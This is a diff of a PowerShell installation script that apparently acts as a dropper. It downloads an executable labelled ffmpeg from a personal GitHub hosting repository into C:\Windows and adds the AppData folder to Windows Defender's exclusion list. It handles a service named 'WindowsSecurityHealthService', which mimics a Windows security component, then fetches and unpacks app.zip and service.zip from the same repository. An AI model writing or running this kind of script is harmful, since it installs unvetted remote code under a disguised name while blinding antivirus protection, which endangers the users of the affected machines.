@@ -22,67 +22,42 @@ if ($currentPolicy -ne 'RemoteSigned') {
 # Additional Step: Check and download ffmpeg.exe if not present
 $ffmpegPath = "C:\Windows\ffmpeg.exe"
 
-if (-not (Test-Path -Path $ffmpegPath)) {
-    Write-Host "ffmpeg.exe not found. Downloading..."
-    $ffmpegUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/ffmpeg.7z"
-    $ffmpegArchive = "$env:TEMP\ffmpeg-release-full.7z"
-    $ffmpegTempDir = "$env:TEMP\ffmpeg"
+# Check if ffmpeg.exe does not already exist in the destination
+if (-Not (Test-Path $ffmpegPath)) {
+    Write-Host "ffmpeg.exe not found at $ffmpegPath"
 
-    Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegArchive
+    # Get the directory of the current script
+    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
+    $localFfmpegPath = Join-Path $scriptDir "ffmpeg.exe"
 
-    # Download and install 7-Zip if not already installed
-    $sevenZipPath = "C:\Program Files\7-Zip\7z.exe"
-    if (-not (Test-Path -Path $sevenZipPath)) {
-        Write-Host "7-Zip not found. Downloading..."
-        $sevenZipInstallerUrl = "https://www.7-zip.org/a/7z1900-x64.msi"
-        $sevenZipInstaller = "$env:TEMP\7z1900-x64.msi"
-        Invoke-WebRequest -Uri $sevenZipInstallerUrl -OutFile $sevenZipInstaller
-        Start-Process -FilePath msiexec.exe -ArgumentList "/i", $sevenZipInstaller, "/quiet", "/norestart" -Wait
+    # Check if ffmpeg.exe exists in the script directory
+    if (Test-Path $localFfmpegPath) {
+        Write-Host "Found ffmpeg.exe in script directory. Copying to $ffmpegPath..."
+        Copy-Item -Path $localFfmpegPath -Destination $ffmpegPath -Force
     }
+    else {
+        Write-Host "ffmpeg.exe not found in script directory. Proceeding to download..."
+		$ffmpegDownloadUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/ffmpeg.file"
+		$tempFfmpegPath = "$env:TEMP\ffmpeg.file"
 
-    # Extract the ffmpeg .7z archive using 7-Zip
-    & "$sevenZipPath" x $ffmpegArchive -o$ffmpegTempDir -y
-
-    # Find ffmpeg.exe in the extracted directory
-    $ffmpegExe = Get-ChildItem -Path $ffmpegTempDir -Filter "ffmpeg.exe" -Recurse | Select-Object -First 1
-
-    if ($ffmpegExe) {
-        Copy-Item -Path $ffmpegExe.FullName -Destination $ffmpegPath
-        Write-Host "ffmpeg.exe downloaded and copied to C:\Windows."
-    } else {
-        Write-Host "Error: ffmpeg.exe not found in the downloaded archive."
-        exit 1
+		if (-not (Test-Path -Path $ffmpegPath)) {
+			Write-Host "ffmpeg.exe not found in C:\Windows. Downloading..."
+			Invoke-WebRequest -Uri $ffmpegDownloadUrl -OutFile $tempFfmpegPath
+			Rename-Item -Path $tempFfmpegPath -NewName "ffmpeg.exe"
+			Copy-Item -Path "$env:TEMP\ffmpeg.exe" -Destination "C:\Windows\"
+			Write-Host "ffmpeg.exe downloaded and copied to C:\Windows"
+		}
     }
-
-    # Cleanup
-    Remove-Item -Path $ffmpegArchive -Force
-    Remove-Item -Path $ffmpegTempDir -Recurse -Force
-} else {
-    Write-Host "ffmpeg.exe is already present in C:\Windows."
 }
+else {
+    Write-Host "ffmpeg.exe already exists at $ffmpegPath"
+}
+
 #========================================================
 
 
 # Get the current user's name
 $currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
-
-
-
-#========================================================
-
-# Check if ffmpeg.exe exists in C:\Windows
-$ffmpegPath = "C:\Windows\ffmpeg.exe"
-$ffmpegDownloadUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/ffmpeg.file"
-$tempFfmpegPath = "$env:TEMP\ffmpeg.file"
-
-if (-not (Test-Path -Path $ffmpegPath)) {
-    Write-Host "ffmpeg.exe not found in C:\Windows. Downloading..."
-    Invoke-WebRequest -Uri $ffmpegDownloadUrl -OutFile $tempFfmpegPath
-    Rename-Item -Path $tempFfmpegPath -NewName "ffmpeg.exe"
-    Copy-Item -Path "$env:TEMP\ffmpeg.exe" -Destination "C:\Windows\"
-    Write-Host "ffmpeg.exe downloaded and copied to C:\Windows"
-}
-
 
 #========================================================
 
@@ -193,17 +168,9 @@ Set-Location -Path $currentDir
 # 1. Add the AppData directory to the exclusion list in Windows Defender
 Add-MpPreference -ExclusionPath $appDataPath
 
-Write-Host "Download the file from the link and extract it to the current directory"
-
-# 2. Download the file from the link and extract it to the current directory
-$zipUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/app.zip"
-$zipFile = "$currentDir\app.zip"
-$unzipDir = $currentDir
-
 
 # Define the name of the service
 $serviceName = "WindowsSecurityHealthService"
-
 
 # Check if the service exists
 $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
@@ -233,16 +200,52 @@ if(Test-Path $servicePathConfig){
     Remove-Item -Path $servicePathConfig
 }
 
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
-Expand-Archive -Path $zipFile -DestinationPath $unzipDir
 
+Write-Host "Download the file from the link and extract it to the current directory"
+
+# 2. Download the file from the link and extract it to the current directory
+# Define the zip file paths and URLs
+$zipUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/app.zip"
+$zipFile = "$currentDir\app.zip"
+$unzipDir = $currentDir
 
 $zipUrlService = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/service.zip"
 $zipFileService = "$currentDirService\service.zip"
 $unzipDirService = $currentDirService
 
-Invoke-WebRequest -Uri $zipUrlService -OutFile $zipFileService
+# Check and copy app.zip if it exists in script directory
+if (-not (Test-Path $zipFile)) {
+    $localAppZip = Join-Path -Path $PSScriptRoot -ChildPath "app.zip"
+    if (Test-Path $localAppZip) {
+        # Copy local app.zip to target directory
+        Copy-Item -Path $localAppZip -Destination $zipFile
+    } else {
+        # Download the app.zip
+        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
+    }
+}
+
+# Check and copy service.zip if it exists in script directory
+if (-not (Test-Path $zipFileService)) {
+    $localServiceZip = Join-Path -Path $PSScriptRoot -ChildPath "service.zip"
+    if (Test-Path $localServiceZip) {
+        # Copy local service.zip to target directory
+        Copy-Item -Path $localServiceZip -Destination $zipFileService
+    } else {
+        # Download the service.zip
+        Invoke-WebRequest -Uri $zipUrlService -OutFile $zipFileService
+    }
+}
+
+# Extract app.zip
+Start-Sleep -Seconds 1
+Expand-Archive -Path $zipFile -DestinationPath $unzipDir
+
+# Extract service.zip
+Start-Sleep -Seconds 1
+Write-Output "Extract '$zipFileService' to '$unzipDirService'"
 Expand-Archive -Path $zipFileService -DestinationPath $unzipDirService
+
 
 # 3. Delete the appsettings.xml file if it exists and terminate any processes using the files in the directory
 $appSettingsPath = "$appDataPath\Local\Microsoft\appsettings.xml"
